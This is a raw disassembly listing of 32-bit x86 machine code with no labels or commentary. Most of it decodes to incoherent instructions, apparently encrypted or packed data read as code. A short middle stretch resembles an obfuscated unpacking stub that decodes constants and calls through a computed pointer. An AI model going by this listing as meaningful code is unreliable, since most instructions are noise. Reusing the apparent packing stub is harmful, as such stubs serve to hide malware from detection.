  408ac1:	mov    esi,0x4e6f818
  408ac6:	push   esp
  408ac7:	clc    
  408ac8:	inc    eax
  408ac9:	jno    0x408b09
  408acb:	xchg   esi,eax
  408acc:	ror    dl,0xcf
  408acf:	jo     0x408b2c
  408ad1:	lea    eax,[esi+0xec6e4a0]
  408ad7:	xchg   esi,eax
  408ad8:	movhps QWORD PTR [eax],xmm1
  408adb:	mov    ecx,0xfa00ceeb
  408ae0:	xchg   edx,eax
  408ae1:	add    al,0x17
  408ae3:	sub    eax,DWORD PTR [bp+si+0x5df6]
  408ae8:	das    
  408ae9:	pop    es
  408aea:	loopne 0x408a74
  408aec:	push   es
  408aed:	dec    edx
  408aee:	sbb    eax,DWORD PTR [edi+edi*8-0x17]
  408af2:	pop    esp
  408af3:	mov    al,0x7a
  408af5:	sub    dh,ch
  408af7:	jae    0x408b0d
  408af9:	add    al,cl
  408afb:	and    BYTE PTR [esi-0xb2ee8db],ch
  408b01:	nop
  408b02:	push   edi
  408b03:	mov    eax,ds:0xed02a985
  408b08:	inc    edi
  408b09:	call   0x3b40:0x52cf18c4
  408b10:	popa   
  408b11:	js     0x408b8a
  408b13:	shr    BYTE PTR [eax],1
  408b15:	jno    0x408aa0
  408b17:	jns    0x408b28
  408b19:	and    bl,ch
  408b1b:	cmp    eax,DWORD PTR [eax+edi*1]
  408b1e:	sbb    eax,0x3cb6ee84
  408b23:	mov    esi,0x3acb78b8
  408b28:	scas   eax,DWORD PTR es:[edi]
  408b29:	jmp    0x408b84
  408b2b:	or     al,0x5f
  408b2d:	(bad)  
  408b2e:	mov    ch,0x70
  408b30:	inc    ebx
  408b31:	mov    cl,0xf6
  408b33:	mov    al,0xb6
  408b35:	sub    bl,ah
  408b37:	jb     0x408b0c
  408b39:	cmp    DWORD PTR [edx-0x40],edi
  408b3c:	pop    edx
  408b3d:	int    0xe2
  408b3f:	mov    al,0xd0
  408b41:	repz retf 
  408b43:	add    DWORD PTR [ebx-0x5e2a9c08],0xffffffda
  408b4a:	push   ecx
  408b4b:	das    
  408b4c:	jl     0x408b0f
  408b4e:	test   DWORD PTR [ecx-0x43],edx
  408b51:	cdq    
  408b52:	or     eax,0x543e5aae
  408b57:	xlat   BYTE PTR ds:[ebx]
  408b58:	sahf   
  408b59:	push   cs
  408b5a:	xchg   esi,eax
  408b5b:	lea    edx,[ecx+0x18]
  408b5e:	cmp    esi,DWORD PTR [ebx]
  408b60:	sbb    al,0xcc
  408b62:	push   cs
  408b63:	pop    esi
  408b64:	push   cs
  408b65:	daa    
  408b66:	jb     0x408b13
  408b68:	push   edx
  408b69:	cmp    ebp,ecx
  408b6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b6c:	cld    
  408b6d:	stos   DWORD PTR es:[edi],eax
  408b6e:	test   eax,0x35db32a4
  408b73:	cmc    
  408b74:	mov    DWORD PTR [edi+0x34],ebx
  408b77:	cdq    
  408b78:	push   cs
  408b79:	xchg   BYTE PTR [ecx-0x6e6149e1],bl
  408b7f:	adc    DWORD PTR [edi],ecx
  408b81:	jp     0x408b78
  408b83:	jle    0x408bd4
  408b85:	lods   eax,DWORD PTR ds:[esi]
  408b86:	mov    ah,0xb0
  408b88:	sar    dl,0x21
  408b8b:	sbb    eax,0xb8b33ed9
  408b90:	js     0x408b49
  408b92:	call   0xd2e1628a
  408b97:	push   eax
  408b98:	fwait
  408b99:	pop    edi
  408b9a:	daa    
  408b9b:	and    al,0x5e
  408b9d:	push   es
  408b9e:	mov    esi,edi
  408ba0:	popa   
  408ba1:	jbe    0x408bab
  408ba3:	mov    ch,0xc6
  408ba5:	lds    edx,FWORD PTR [esi+edx*2+0x1c]
  408ba9:	pop    ecx
  408baa:	rcl    DWORD PTR [eax],0xaa
  408bad:	mov    al,0x39
  408baf:	xor    eax,0xde588316
  408bb4:	fild   WORD PTR [edi+0x2abe1a6]
  408bba:	(bad)  
  408bbb:	pop    DWORD PTR [ebx-0x4f]
  408bbe:	push   edi
  408bbf:	cmp    bl,BYTE PTR [eax-0x42]
  408bc2:	mov    ecx,0xf7147df2
  408bc7:	gs jle 0x408b66
  408bca:	bound  ebp,QWORD PTR ds:0x207de7ce
  408bd0:	and    al,0xe7
  408bd2:	in     al,0x5a
  408bd4:	add    al,0x82
  408bd6:	xor    DWORD PTR [ebp-0x6b],ecx
  408bd9:	push   cs
  408bda:	jg     0x408b88
  408bdc:	jnp    0x408b83
  408bde:	inc    esi
  408bdf:	xchg   ebp,eax
  408be0:	(bad)  
  408be1:	imul   ecx,DWORD PTR [ecx-0x7df2ca2c],0x1e
  408be8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408be9:	dec    edi
  408bea:	pop    edx
  408beb:	and    DWORD PTR [ebx],eax
  408bed:	push   edx
  408bee:	out    dx,al
  408bef:	jmp    0x67b41b17
  408bf4:	mov    edi,0x458d4e85
  408bf9:	(bad)  [ecx-0x27]
  408bfc:	cli    
  408bfd:	dec    edi
  408bfe:	dec    ebp
  408bff:	sbb    DWORD PTR [ebx+0x5c],esp
  408c02:	hlt    
  408c03:	(bad)  
  408c04:	aad    0x1d
  408c06:	fcmovnb st,st(0)
  408c08:	pop    esp
  408c09:	push   ebp
  408c0a:	push   ds
  408c0b:	pop    edx
  408c0c:	mov    ecx,DWORD PTR [ecx+0x7a]
  408c0f:	xlat   BYTE PTR ds:[ebx]
  408c10:	mov    edx,0x6bcc07ad
  408c15:	sub    eax,0x9297a7f8
  408c1a:	mov    ?,WORD PTR [esi-0x7e50e84a]
  408c20:	iret   
  408c21:	xlat   BYTE PTR ds:[ebx]
  408c22:	push   es
  408c23:	in     eax,0x3b
  408c25:	lods   eax,DWORD PTR ds:[esi]
  408c26:	ss xor eax,0x49cc02df
  408c2c:	mov    dh,0x52
  408c2e:	fnstcw WORD PTR [ebx-0x3ba10f1c]
  408c34:	cmp    bl,BYTE PTR [eax-0x512124cf]
  408c3a:	lds    edi,FWORD PTR [ecx+0x69]
  408c3d:	aam    0x83
  408c3f:	adc    bh,BYTE PTR [edi-0x7dd36983]
  408c45:	cmp    eax,0xd5216a30
  408c4a:	daa    
  408c4b:	or     edx,DWORD PTR [ecx+0x347ce6e5]
  408c51:	xchg   ecx,eax
  408c52:	ficomp WORD PTR [eax-0x7c7f65e6]
  408c58:	pop    edi
  408c59:	jns    0x408caf
  408c5b:	les    esp,FWORD PTR [ebx-0x4f385b9d]
  408c61:	fcom   DWORD PTR [ecx-0x63]
  408c64:	push   0x2b
  408c66:	jb     0x408ce1
  408c68:	mov    ds:0x5396d615,al
  408c6d:	out    0xc0,eax
  408c6f:	daa    
  408c70:	cld    
  408c71:	jle    0x408cc2
  408c73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c74:	fadd   QWORD PTR ds:[esi+0x58]
  408c78:	mov    al,ds:0xcfacd639
  408c7d:	push   edx
  408c7e:	ror    BYTE PTR [esp+esi*1-0x3e],1
  408c82:	jae    0x408cdd
  408c84:	xchg   ebx,eax
  408c85:	rcl    DWORD PTR [edx+0x1aab5146],cl
  408c8b:	retf   0x691a
  408c8e:	add    eax,eax
  408c90:	jns    0x408c77
  408c92:	test   DWORD PTR [ebx+0x69a4d0fa],esi
  408c98:	or     eax,0xbd572dde
  408c9d:	mov    al,0x3e
  408c9f:	iret   
  408ca0:	nop
  408ca1:	fild   QWORD PTR [ecx]
  408ca3:	inc    ebx
  408ca4:	mov    WORD PTR [ebp-0x674cb87d],?
  408caa:	(bad)  
  408cab:	jbe    0x408d02
  408cad:	jno    0x408c6f
  408caf:	sbb    BYTE PTR [esi+0x1],cl
  408cb2:	inc    DWORD PTR [edx]
  408cb4:	sar    BYTE PTR [ebx-0xc],0x58
  408cb8:	jne    0x408cae
  408cba:	shrd   esi,edx,cl
  408cbd:	repnz push esi
  408cbf:	repnz xchg edx,eax
  408cc1:	sub    eax,0xd8462d8a
  408cc6:	outs   dx,DWORD PTR ds:[esi]
  408cc7:	xchg   BYTE PTR [ebp+0x14],al
  408cca:	jge    0x408ce6
  408ccc:	js     0x408d46
  408cce:	sbb    DWORD PTR [edx-0x52],ebx
  408cd1:	jne    0x408cec
  408cd3:	dec    ebx
  408cd4:	xchg   ebx,eax
  408cd5:	inc    ebp
  408cd6:	jecxz  0x408d38
  408cd8:	je     0x408c96
  408cda:	and    eax,eax
  408cdc:	into   
  408cdd:	jne    0x408cd2
  408cdf:	xchg   ecx,eax
  408ce0:	ins    DWORD PTR es:[edi],dx
  408ce1:	push   edi
  408ce2:	add    esp,eax
  408ce4:	jb     0x408cb6
  408ce6:	add    eax,DWORD PTR [ebx]
  408ce8:	mov    al,ds:0xa265399b
  408ced:	or     edx,esp
  408cef:	add    BYTE PTR [ecx-0x2d],ah
  408cf2:	dec    DWORD PTR ds:0xf670c4a
  408cf8:	jmp    0x408cdd
  408cfa:	(bad)  
  408cfb:	int    0x90
  408cfd:	ret    0xa56
  408d00:	push   cs
  408d01:	int3   
  408d02:	add    bl,BYTE PTR [edx+0xf]
  408d05:	test   DWORD PTR [ecx-0x24],eax
  408d08:	(bad)  
  408d09:	dec    DWORD PTR [ebx+0x5e9c6]
  408d0f:	add    BYTE PTR [eax],al
  408d11:	mov    eax,0x3272db
  408d16:	mov    ebx,0x7510893
  408d1b:	mov    ecx,DWORD PTR [ebp-0x4]
  408d1e:	xor    ecx,ebx
  408d20:	add    ecx,eax
  408d22:	mov    DWORD PTR [ebp-0xc],ecx
  408d25:	mov    ebx,0x65655
  408d2a:	add    ebx,0x3234
  408d30:	xchg   ebx,esi
  408d32:	xor    ebx,ebx
  408d34:	push   esi
  408d35:	mov    esi,ebx
  408d37:	pop    ebx
  408d38:	mov    edx,esi
  408d3a:	add    ebx,0x1002
  408d40:	lea    eax,[ebp-0x10]
  408d43:	add    edx,eax
  408d45:	add    edx,0x5
  408d48:	push   edx
  408d49:	inc    esi
  408d4a:	pop    ecx
  408d4b:	dec    ecx
  408d4c:	xchg   ecx,eax
  408d4d:	dec    eax
  408d4e:	xchg   ecx,eax
  408d4f:	dec    ecx
  408d50:	xchg   ecx,edx
  408d52:	dec    edx
  408d53:	push   edx
  408d54:	mov    edx,ebx
  408d56:	pop    ebx
  408d57:	dec    ebx
  408d58:	call   DWORD PTR [ebx]
  408d5a:	cmp    DWORD PTR [ebp+0x10],esi
  408d5d:	je     0x408d7c
  408d63:	xchg   edx,eax
  408d64:	push   0xb
  408d66:	pop    ecx
  408d67:	push   0x4
  408d69:	pop    ebx
  408d6a:	inc    ebx
  408d6b:	xchg   ebx,ecx
  408d6d:	sub    ebx,ecx
  408d6f:	xchg   ebx,ecx
  408d71:	dec    ecx
  408d72:	dec    ecx
  408d73:	mov    eax,DWORD PTR [ebp-0x1c]
  408d76:	imul   eax,ecx
  408d79:	add    esp,eax
  408d7b:	xchg   edx,eax
  408d7c:	push   eax
  408d7d:	xor    ebx,ebx
  408d7f:	mov    edx,esp
  408d81:	dec    edx
  408d82:	inc    ebx
  408d83:	add    ebx,DWORD PTR [edx+ebx*1]
  408d86:	dec    ebx
  408d87:	xor    edx,edx
  408d89:	add    DWORD PTR [ebp-0xc],ebx
  408d8c:	pop    ebx
  408d8d:	mov    eax,DWORD PTR [ebp-0xc]
  408d90:	pop    edi
  408d91:	pop    esi
  408d92:	pop    ebx
  408d93:	leave  
  408d94:	ret    0x10
  408d97:	push   ebp
  408d98:	mov    ebp,esp
  408d9a:	push   ecx
  408d9b:	xor    ecx,ecx
  408d9d:	xor    ecx,DWORD PTR ds:0x42600c
  408da3:	and    DWORD PTR ds:0x426014,ecx
  408da9:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  408db0:	mov    eax,DWORD PTR [ebp-0x4]
  408db3:	sub    edx,edx
  408db5:	mov    edx,DWORD PTR [ebp+0x10]
  408db8:	and    DWORD PTR ds:0x427014,ebx
  408dbe:	mov    ecx,0x7510893
  408dc3:	xor    eax,ecx
  408dc5:	add    eax,0x3272db
  408dca:	mov    DWORD PTR [edx],eax
  408dcc:	mov    DWORD PTR ds:0x426008,0x4f8c
  408dd6:	mov    eax,DWORD PTR [ebp+0xc]
  408dd9:	sbb    DWORD PTR ds:0x425020,0x2880
  408de3:	xor    eax,ecx
  408de5:	and    DWORD PTR ds:0x429008,0x0
  408def:	mov    edx,DWORD PTR ds:0x429008
  408df5:	inc    edx
  408df6:	mov    DWORD PTR ds:0x429008,edx
  408dfc:	cmp    DWORD PTR ds:0x429008,0x17
  408e03:	jne    0x408e19
  408e09:	push   0x41ff61
  408e0e:	push   0x391b
  408e13:	call   DWORD PTR ds:0x421008
  408e19:	cmp    DWORD PTR ds:0x429008,0x15
  408e20:	jb     0x408def
  408e26:	xor    DWORD PTR ds:0x42700c,edi
  408e2c:	push   esi
  408e2d:	mov    esi,DWORD PTR [ebp+0x10]
  408e30:	mov    edx,0x3272db
  408e35:	add    eax,edx
  408e37:	mov    DWORD PTR [esi+0x4],eax
  408e3a:	mov    eax,DWORD PTR [ebp+0x14]
  408e3d:	mov    esi,DWORD PTR [ebp+0x10]
  408e40:	mov    DWORD PTR [esi+0x8],eax
  408e43:	jmp    0x40b197
  408e48:	push   ebp
  408e49:	add    al,0x4c
  408e4b:	mov    al,ds:0x6365b8eb
  408e50:	add    eax,0x443327cf
  408e55:	sub    BYTE PTR [ecx],ch
  408e57:	cmp    ecx,DWORD PTR [edx+0x2b626219]
  408e5d:	pop    edi
  408e5e:	bound  esp,QWORD PTR [edx-0x55]
  408e61:	ret    
  408e62:	mov    ds:0x985f2b49,al
  408e67:	mov    BYTE PTR [edi-0x261cc4d0],dl
  408e6d:	in     eax,0xfa
  408e6f:	adc    ecx,DWORD PTR [edx]
  408e71:	shr    BYTE PTR [ecx],cl
  408e73:	shl    DWORD PTR [edx-0x5fe69073],cl
  408e79:	cmp    al,0x64
  408e7b:	aad    0xc
  408e7d:	xlat   BYTE PTR ds:[ebx]
  408e7e:	lods   eax,DWORD PTR ds:[esi]
  408e7f:	or     dh,BYTE PTR [esi]
  408e81:	mov    esi,0x714fc100
  408e86:	pop    ds
  408e87:	dec    esp
  408e88:	xor    eax,0x2942c925
  408e8d:	xchg   ecx,eax
  408e8e:	int3   
  408e8f:	pop    ebp
  408e90:	jmp    0xdeb704d1
  408e95:	in     al,dx
  408e96:	mov    ecx,0x7c14c070
  408e9b:	mov    eax,0x6bd577e3
  408ea0:	sbb    al,0xed
  408ea2:	sbb    BYTE PTR [edx+0x163fc470],dl
  408ea8:	je     0x408e59
  408eaa:	pop    ecx
  408eab:	fisttp QWORD PTR [ecx+0x5eda8d87]
  408eb1:	sub    bl,0x83
  408eb4:	in     al,dx
  408eb5:	add    ah,al
  408eb7:	aas    
  408eb8:	inc    eax
  408eb9:	lds    edx,FWORD PTR [ecx-0x14ea6d46]
  408ebf:	popf   
  408ec0:	mov    ch,0xfb
  408ec2:	xchg   edi,eax
  408ec3:	adc    esi,DWORD PTR [edx]
  408ec5:	fild   QWORD PTR [di-0x5f4d]
  408eca:	int    0x51
  408ecc:	jmp    0x408e75
  408ece:	and    BYTE PTR [edx],dl
  408ed0:	mov    ?,WORD PTR [ecx+0x38c96616]
  408ed6:	pop    ebx
  408ed7:	inc    edx
  408ed8:	lods   al,BYTE PTR ds:[esi]
  408ed9:	push   cs
  408eda:	dec    ebp
  408edb:	stos   BYTE PTR es:[edi],al
  408edc:	das    
  408edd:	clc    
  408ede:	mov    bl,0x53
  408ee0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ee1:	call   0xa5a2:0x3202bc2e
  408ee8:	test   al,0xc7
  408eea:	mov    al,0xff
  408eec:	push   esi
  408eed:	add    DWORD PTR [esi],esp
  408eef:	(bad)  
  408ef0:	mov    edx,0xc54ea774
  408ef5:	sub    BYTE PTR [edx+edx*1],0x7a
  408ef9:	jno    0x408f19
  408efb:	jmp    0x69917660
  408f00:	jne    0x408f2c
  408f02:	or     eax,0x3f1540ea
  408f07:	adc    BYTE PTR ds:0xceb4b953,cl
  408f0d:	sbb    BYTE PTR [esi+0x54],bl
  408f10:	cmp    bl,BYTE PTR [edi]
  408f12:	mov    edx,0x70a9d67f
  408f17:	and    dl,BYTE PTR [edi-0x7c]
  408f1a:	retf   0x3ca8
  408f1d:	in     al,0x69
  408f1f:	pop    esi
  408f20:	out    dx,eax
  408f21:	bound  eax,QWORD PTR [ebp-0x2e140ff0]
  408f27:	jmp    0x2152:0xdf42734e
  408f2e:	pop    edx
  408f2f:	xor    al,0xfc
  408f31:	sub    BYTE PTR [esp+ebp*8-0x8075a53],0x3f
  408f39:	sbb    eax,0x79d4ce6c
  408f3e:	sub    ebx,eax
  408f40:	ret    0x2ed8
  408f43:	cwde   
  408f44:	xchg   edx,eax
  408f45:	das    
  408f46:	mov    ebx,edi
  408f48:	sar    edx,cl
  408f4a:	stos   DWORD PTR es:[edi],eax
  408f4b:	push   0xffffffff
  408f4d:	push   esi
  408f4e:	lock xor esp,DWORD PTR [ecx+0xd795e35]
  408f55:	rol    DWORD PTR [ebp+0x3dcff1fb],cl
  408f5b:	mov    ch,0x77
  408f5d:	cdq    
  408f5e:	xchg   ecx,eax
  408f5f:	add    esi,DWORD PTR ds:0x95474236
  408f65:	loop   0x408f22
  408f67:	fcom   st(6)
  408f69:	push   0x34ca4c6e
  408f6e:	movq   QWORD PTR [eax-0x2e],mm5
  408f72:	mov    ds:0xa309d1de,eax
  408f77:	enter  0x16e1,0xde
  408f7b:	jl     0x408f1b
  408f7d:	xchg   edi,eax
  408f7e:	lods   eax,DWORD PTR ds:[esi]
  408f7f:	add    bh,BYTE PTR [ebx-0x3d]
  408f82:	clc    
  408f83:	jno    0x408f9f
  408f85:	dec    edi
  408f86:	add    bl,BYTE PTR [ebx+0x5]
  408f89:	inc    edi
  408f8a:	mov    cl,0x6f
  408f8c:	sbb    DWORD PTR [eax+0x399f8546],esi
  408f92:	addr16 add al,0xce
  408f95:	inc    esp
  408f96:	or     ecx,DWORD PTR [esi]
  408f98:	jne    0x408f5f
  408f9a:	stos   BYTE PTR es:[edi],al
  408f9b:	outs   dx,BYTE PTR ds:[esi]
  408f9c:	push   ebp
  408f9d:	cmc    
  408f9e:	dec    ebp
  408f9f:	pop    eax
  408fa0:	xchg   ebp,eax
  408fa1:	fild   WORD PTR [esi-0x1833d929]
  408fa7:	cli    
  408fa8:	lods   al,BYTE PTR ds:[esi]
  408fa9:	mov    eax,0xa55b2d0d
  408fae:	push   ebx
  408faf:	dec    ecx
  408fb0:	adc    eax,DWORD PTR [esi-0x77ed4cc5]
  408fb6:	pop    eax
  408fb7:	jge    0x408fae
  408fb9:	add    DWORD PTR [eax+edi*2-0x57],esi
  408fbd:	xor    DWORD PTR [esi],0xb3acab42
  408fc3:	loopne 0x409022
  408fc5:	dec    ecx
  408fc6:	outs   dx,DWORD PTR ds:[esi]
  408fc7:	dec    edx
  408fc8:	or     DWORD PTR [esi+eiz*8],0x2189010f
  408fcf:	push   esp
  408fd0:	adc    eax,0x3e5f516f
  408fd5:	(bad)  
  408fd6:	fcomp  QWORD PTR [ecx]
  408fd8:	lods   al,BYTE PTR ds:[esi]
  408fd9:	jns    0x409004
  408fdb:	mov    esi,?
  408fdd:	pop    esp
  408fde:	dec    edx
  408fdf:	ret    
  408fe0:	xchg   esi,eax
  408fe1:	mov    esi,0x7b9dc3c
  408fe6:	pusha  
  408fe7:	sub    BYTE PTR [ecx+0x7b],dl
  408fea:	mov    ebp,0xbb10550d
  408fef:	sti    
  408ff0:	sbb    eax,0x20ed17ad
  408ff5:	or     DWORD PTR [edi],ecx
  408ff7:	jl     0x408fa9
  408ff9:	and    BYTE PTR [edx],dh
  408ffb:	fdivr  DWORD PTR [ebx+0x3bbea303]
  409001:	es xor al,0x59
  409004:	push   ss
  409005:	call   0x30e7:0x788e593a
  40900c:	aaa    
  40900d:	xchg   esp,eax
  40900e:	jnp    0x408fe4
  409010:	adc    eax,ebp
  409012:	cdq    
  409013:	sbb    al,0x3f
  409015:	dec    esi
  409016:	ins    DWORD PTR es:[edi],dx
  409017:	fiadd  WORD PTR [edi]
  409019:	retf   
  40901a:	dec    esp
  40901b:	data16 fistp DWORD PTR [esp+edx*8+0x51]
  409020:	pushf  
  409021:	dec    edi
  409022:	into   
  409023:	mov    esp,0xd737e54a
  409028:	mov    DWORD PTR [esi+0x34],0x9178f4ad
  40902f:	and    DWORD PTR [ecx],0xffffff88
  409032:	push   ss
  409033:	mov    WORD PTR [ecx+0x52],?
  409036:	pop    esi
  409037:	sbb    BYTE PTR [ebx+0x77ddd614],bh
  40903d:	and    eax,0xf95be4f2
  409042:	sahf   
  409043:	xchg   edi,eax
  409044:	outs   dx,BYTE PTR ds:[esi]
  409045:	aam    0xa
  409047:	or     al,0x2d
  409049:	push   0xffffff9c
  40904b:	inc    eax
  40904c:	xchg   esp,eax
  40904d:	mov    edi,0x948f5884
  409052:	sbb    eax,0xaad15d2a
  409057:	mov    esi,DWORD PTR [edi-0x45a1618]
  40905d:	pop    ds
  40905e:	imul   ebp,DWORD PTR [ebp+0x177d8bd8],0x5116ff49
  409068:	xor    dh,BYTE PTR [edi-0x68355d0b]
  40906e:	leave  
  40906f:	in     al,0x9
  409071:	pop    esp
  409072:	loopne 0x40908b
  409074:	mov    ch,BYTE PTR [ebx]
  409076:	lahf   
  409077:	mov    ch,0x2d
  409079:	fcomp  DWORD PTR [edx]
  40907b:	test   eax,0xefeada1
  409080:	lds    ebx,FWORD PTR [ecx]
  409082:	clc    
  409083:	ret    
  409084:	cmp    BYTE PTR [ebx+0x2d],0x52
  409088:	imul   edx,ebx,0x2e
  40908b:	or     ebx,DWORD PTR [edi+0x3e]
  40908e:	cmc    
  40908f:	loopne 0x4090e6
  409091:	iret   
  409092:	push   edi
  409093:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409094:	pusha  
  409095:	pop    ecx
  409096:	or     al,0xc8
  409098:	sti    
  409099:	xor    bl,BYTE PTR [eax+0x17f7e33a]
  40909f:	adc    eax,0xd481ce9
  4090a4:	sahf   
  4090a5:	(bad)  
  4090a6:	leave  
  4090a7:	dec    ecx
  4090a8:	outs   dx,DWORD PTR ds:[esi]
  4090a9:	cmp    BYTE PTR [ecx-0x51],bl
  4090ac:	mov    dh,0x6
  4090ae:	stos   DWORD PTR es:[edi],eax
  4090af:	das    
  4090b0:	fst    QWORD PTR [ecx+0x36f55c80]
  4090b6:	dec    eax
  4090b7:	sub    dl,bl
  4090b9:	mov    eax,0x89de2d37
  4090be:	xchg   edx,eax
  4090bf:	xchg   ebx,eax
  4090c0:	mov    edi,0xf606e192
  4090c5:	sahf   
  4090c6:	test   DWORD PTR [ecx],ebp
  4090c8:	inc    edx
  4090c9:	mov    cl,0x1a
  4090cb:	fwait
  4090cc:	test   BYTE PTR ds:0x55e4dd0e,ah
  4090d2:	and    bl,bl
  4090d4:	call   0xd24e1253
  4090d9:	xor    ebx,ebx
  4090db:	xlat   BYTE PTR ds:[ebx]
  4090dc:	sub    al,0xc6
  4090de:	inc    eax
  4090df:	mov    DWORD PTR [esi+0x3a8852b8],edi
  4090e5:	stos   BYTE PTR es:[edi],al
  4090e6:	inc    eax
  4090e7:	pop    ds
  4090e8:	xor    BYTE PTR [ecx+ebx*8-0x7ad94377],bh
  4090ef:	outs   dx,BYTE PTR ds:[esi]
  4090f0:	repnz and dh,dh
  4090f3:	adc    edi,DWORD PTR [edi+0x516c21d9]
  4090f9:	std    
  4090fa:	sti    
  4090fb:	mov    ds:0x61662528,al
  409100:	jle    0x409150
  409102:	jl     0x409142
  409104:	dec    esi
  409105:	mov    ds:0x2984f3d2,eax
  40910a:	jmp    0x85a5:0xfcd9be93
  409111:	mov    dl,0x19
  409113:	(bad)  
  409114:	push   ds
  409115:	xor    eax,DWORD PTR [esi+0x1a9208e7]
  40911b:	cmp    ebx,DWORD PTR [esi]
  40911d:	(bad)  
  40911e:	in     al,0x12
  409120:	cmp    dl,BYTE PTR [ebx]
  409122:	inc    ebp
  409123:	sub    BYTE PTR [ebx-0x6b0eaf2d],al
  409129:	mov    edx,0x76fa454c
  40912e:	pop    esp
  40912f:	stos   BYTE PTR es:[edi],al
  409130:	fwait
  409131:	mov    cl,bh
  409133:	(bad)  
  409134:	lahf   
  409135:	mov    edx,0xaaf95c43
  40913a:	and    esi,eax
  40913c:	and    eax,0x8e3dae9
  409141:	mov    eax,0x122b2418
  409146:	ja     0x4090d8
  409148:	sbb    DWORD PTR [esp+ecx*4],edx
  40914b:	mov    WORD PTR [ecx],?
  40914d:	arpl   WORD PTR ds:0xcf8d97c0,sp
  409153:	mov    gs,WORD PTR [esp+ebx*8+0x7519704a]
  40915a:	push   ds
  40915b:	test   DWORD PTR [eax+edx*2+0x534708e3],0xe086f230
  409166:	cmc    
  409167:	loopne 0x409146
  409169:	mov    edx,0x209281d2
  40916e:	test   al,0xaf
  409170:	jmp    0x409160
  409172:	clc    
  409173:	push   0x3c
  409175:	cli    
  409176:	loop   0x4091d0
  409178:	mov    ecx,0x692d2ed8
  40917d:	jno    0x40913e
  40917f:	retf   
  409180:	nop
  409181:	mov    bl,0xab
  409183:	pushf  
  409184:	stos   BYTE PTR es:[edi],al
  409185:	dec    eax
  409186:	cmp    DWORD PTR [esi],eax
  409188:	mov    ds:0xb813366e,eax
  40918d:	pop    eax
  40918e:	mov    eax,ds:0xa17ed286
  409193:	xchg   esi,eax
  409194:	aas    
  409195:	jae    0x4091f7
  409197:	cdq    
  409198:	xor    ecx,edi
  40919a:	mov    dh,0x2a
  40919c:	sar    edi,1
  40919e:	es cdq 
  4091a0:	and    dh,BYTE PTR [ebp-0x5fdebb3f]
  4091a6:	push   edi
  4091a7:	iret   
  4091a8:	xchg   edi,eax
  4091a9:	push   eax
  4091aa:	jmp    0x4091e2
  4091ac:	sti    
  4091ad:	push   esp
  4091ae:	jnp    0x4091a5
  4091b0:	push   ecx
  4091b1:	inc    ebp
  4091b2:	ror    BYTE PTR [esi-0x6d],1
  4091b5:	mov    ah,0x5d
  4091b7:	mov    DWORD PTR [ebp-0x11d7d92a],eax
  4091bd:	push   ecx
  4091be:	xor    ecx,DWORD PTR [edi]
  4091c0:	cmp    dl,bl
  4091c2:	std    
  4091c3:	hlt    
  4091c4:	push   es
  4091c5:	jp     0x409210
  4091c7:	outs   dx,DWORD PTR ds:[esi]
  4091c8:	fdiv   QWORD PTR [edx+ecx*4-0x95a3997]
  4091cf:	aas    
  4091d0:	mov    BYTE PTR [edx+ebp*1],bh
  4091d3:	je     0x4091d7
  4091d5:	test   DWORD PTR [ebx],ecx
  4091d7:	fild   QWORD PTR [esp+eiz*2-0x6f]
  4091db:	ret    0xd20e
  4091de:	pop    esp
  4091df:	ss daa 
  4091e1:	jmp    0x4091eb
  4091e3:	daa    
  4091e4:	lahf   
  4091e5:	pop    eax
  4091e6:	xor    ebp,DWORD PTR [ebx+0x72]
  4091e9:	add    al,0x98
  4091eb:	dec    esi
  4091ec:	sub    ecx,DWORD PTR [ebx-0xd337b3e]
  4091f2:	cmc    
  4091f3:	(bad)  
  4091f4:	cpuid  
  4091f6:	jg     0x4091e0
  4091f8:	hlt    
  4091f9:	or     edi,DWORD PTR [edi+0x51]
  4091fc:	xor    al,0x43
  4091fe:	xchg   edi,eax
  4091ff:	xchg   ebp,eax
  409200:	das    
  409201:	pop    esp
  409202:	ret    0xdc75
  409205:	xchg   esp,eax
  409206:	shr    BYTE PTR [ebx-0x12],cl
  409209:	jg     0x409245
  40920b:	call   0x2a4ec5c0
  409210:	xor    DWORD PTR [ebp+0x72],0xffffffba
  409214:	sahf   
  409215:	ins    DWORD PTR es:[edi],dx
  409216:	test   eax,0x4d790111
  40921b:	gs cli 
  40921d:	dec    ecx
  40921e:	mov    BYTE PTR [eax],0x10
  409221:	xchg   ebp,eax
  409222:	adc    DWORD PTR [edi],0xffffff8b
  409225:	jae    0x4091fd
  409227:	push   eax
  409228:	icebp  
  409229:	sar    BYTE PTR [esp+edi*2-0x1a50249d],1
  409230:	mov    ah,0x57
  409232:	ds out dx,eax
  409234:	stos   BYTE PTR es:[edi],al
  409235:	(bad)  
  409236:	lods   al,BYTE PTR ds:[esi]
  409237:	cwde   
  409238:	leave  
  409239:	inc    ecx
  40923a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40923b:	int3   
  40923c:	ss imul esi,DWORD PTR ds:[edx+0x1d2178af],0x31
  409245:	xchg   esp,eax
  409246:	sbb    dh,dl
  409248:	sbb    DWORD PTR [edx-0x2e],esi
  40924b:	pop    ebx
  40924c:	fld    QWORD PTR [esi+0x26]
  40924f:	pop    esp
  409250:	mov    esp,0x3819fbda
  409255:	fisubr WORD PTR [esi+0x20]
  409258:	mov    bl,0xd9
  40925a:	mov    bl,0xd7
  40925c:	cs pusha 
  40925e:	es hlt 
  409260:	mov    esi,0x6d2c7902
  409265:	dec    eax
  409266:	mov    eax,0x531bd6b3
  40926b:	outs   dx,BYTE PTR ds:[esi]
  40926c:	xor    al,0x35
  40926e:	out    dx,al
  40926f:	mov    ebp,0xd2635b62
  409274:	outs   dx,BYTE PTR ds:[esi]
  409275:	std    
  409276:	add    DWORD PTR [eax+eiz*8-0x7c],ebx
  40927a:	into   
  40927b:	cld    
  40927c:	mov    edx,DWORD PTR [ecx+edi*1+0x70]
  409280:	adc    eax,0x41bcf5d3
  409285:	mov    ecx,0xa8db2f6e
  40928a:	mov    ebx,0x813aa491
  40928f:	std    
  409290:	mov    al,0xf9
  409292:	hlt    
  409293:	clc    
  409294:	call   0x2f0b:0xe2e59a4d
  40929b:	rcr    dl,cl
  40929d:	mov    ds:0xc0d0cc8a,eax
  4092a2:	inc    edx
